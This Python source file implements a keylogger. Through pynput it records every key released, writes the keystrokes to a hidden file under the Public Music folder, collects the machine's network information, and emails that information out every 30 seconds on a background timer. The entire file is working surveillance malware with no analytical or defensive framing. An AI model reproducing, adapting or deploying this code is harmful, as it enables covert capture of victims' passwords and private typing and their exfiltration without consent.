import pynput.keyboard
import os as sistema
import sys
import correo
import info
from threading import Timer


EMAIL_DELAY = 30.0
PATH_TO_FILE ="C:/Users/Public/Music/tmp.txt"


def send_email(net_info):
    correo.send(net_info)
    timer = Timer(EMAIL_DELAY,send_email,args=[net_info])
    timer.daemon = True
    timer.start()

def attach_stdout():
    return open(PATH_TO_FILE, "+a") if sistema.path.isfile(PATH_TO_FILE) else open(PATH_TO_FILE, "w")

lista=[]
cadena=""
def capturar(key):
    global lista, cadena
    key1= convertir(key)
    key2= erasecharac(key1)
    if key2==False:
        cadena = cadena + "".join(lista)
        if len(cadena) == 0:
            pass
        else:
            print(cadena,flush=True)
        return False
    elif key2==" ":
        apilar(" ", lista)
        cadena=cadena + "".join(lista)
        lista=[]
    elif key2=="invalido":
        pass
    elif key2=="saltolinea":
        cadena=cadena+"".join(lista)
        valor="\n"+cadena
        print(valor,flush=True)
        cadena=""
        lista=[]
    else:
        apilar(key2, lista)
    
    
    #if key1 == "Key.esc":
    #    return False

    #print ("el teclado capturado es: {}".format(key1))

def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def apilar(key,valores):
    return valores.append(key)

def erasecharac(key):
    if key=="Key.esc":
        return False
    elif key=="Key.space":
        return " "
    elif key=="Key.left":
        return "invalido"

    elif key=="Key.right":
        return "invalido"

    elif key=="Key.up":
        return "invalido"

    elif key=="Key.down":
        return "invalido"

    elif key=="Key.enter" or key=="Key.tab":
        return "saltolinea"
    else:
        return key   

user_info = info.get_net_info()
sys.stdout = attach_stdout()
timer = Timer(EMAIL_DELAY,send_email,args=[user_info])
timer.daemon = True
timer.start()
listener = pynput.keyboard.Listener(on_release=capturar)
listener.daemon = True
listener.start()

while True:
    pass


